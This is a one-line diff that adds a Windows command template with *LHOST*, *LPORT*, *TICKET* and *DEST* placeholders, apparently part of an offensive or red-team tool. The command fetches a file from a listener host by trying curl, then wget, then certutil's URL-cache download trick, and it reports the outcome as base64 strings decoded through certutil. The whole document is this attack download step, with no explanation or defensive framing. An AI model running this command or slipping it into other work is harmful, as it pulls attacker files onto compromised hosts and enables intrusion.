@@ -1,0 +1,1 @@
+(curl.exe -s http://*LHOST*:*LPORT*/*TICKET* --show-error -o *DEST* || wget.exe -q http://*LHOST*:*LPORT*/*TICKET* -O *DEST* || certutil.exe -urlcache -split -f http://*LHOST*:*LPORT*/*TICKET* *DEST*) && echo "U3VjY2VzcyE=" | certutil -decode - stdout || echo "Q29tbWFuZCBmYWlsZWQ=" | certutil -decode - stdout
